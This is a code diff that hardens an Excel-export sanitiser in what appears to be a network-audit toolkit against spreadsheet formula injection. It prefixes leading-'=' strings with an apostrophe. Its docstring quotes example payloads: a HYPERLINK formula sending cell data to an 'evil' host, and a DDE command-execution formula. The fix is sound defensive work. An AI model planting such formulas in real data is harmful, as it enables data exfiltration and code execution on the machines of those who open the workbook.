@@ -42,8 +42,21 @@ def _xls_sanitize(value):
     free-text (a CDP/LLDP neighbour name, an interface description, a banner) -- collected with errors='ignore',
     which passes valid-UTF-8 control bytes through -- can carry these, and a single one aborts the ENTIRE workbook,
     the one deliverable produced unconditionally (there is no --no-excel). Delegates to the shared
-    textutils.xml_safe so the excel + docx generators share ONE implementation of the XML-illegal char set."""
-    return xml_safe(value)
+    textutils.xml_safe so the excel + docx generators share ONE implementation of the XML-illegal char set.
+
+    ALSO neutralizes xlsx FORMULA INJECTION (audit-6 sec HIGH): openpyxl marks a STRING cell whose first
+    char is '=' as a real formula (data_type='f'), so an attacker-influenced device field -- a hostname,
+    interface description, CDP/LLDP neighbour, VLAN name -- set to e.g. =HYPERLINK("http://evil/"&A1,"click")
+    or =cmd|'/c calc'!A1 (DDE) EXECUTES in the CLIENT's workbook when they open it (data exfil / link-spoof /
+    RCE after the enable-content prompt). The toolkit writes NO intentional formula cells (grep: no
+    HYPERLINK/WEBSERVICE/formula construction), so a leading-'=' string is forced back to inert text with
+    Excel's text-prefix apostrophe. ('+', '-', '@' are stored by openpyxl as ordinary strings -- NOT live
+    formulas in the .xlsx -- and are legitimate leading chars in delta ('+3 added'), placeholder ('-') and
+    negative cells, so they are deliberately left unprefixed to avoid corrupting real content on re-read.)"""
+    v = xml_safe(value)
+    if isinstance(v, str) and v.startswith("="):
+        v = "'" + v
+    return v
 
 
 def _harden_ws(ws):
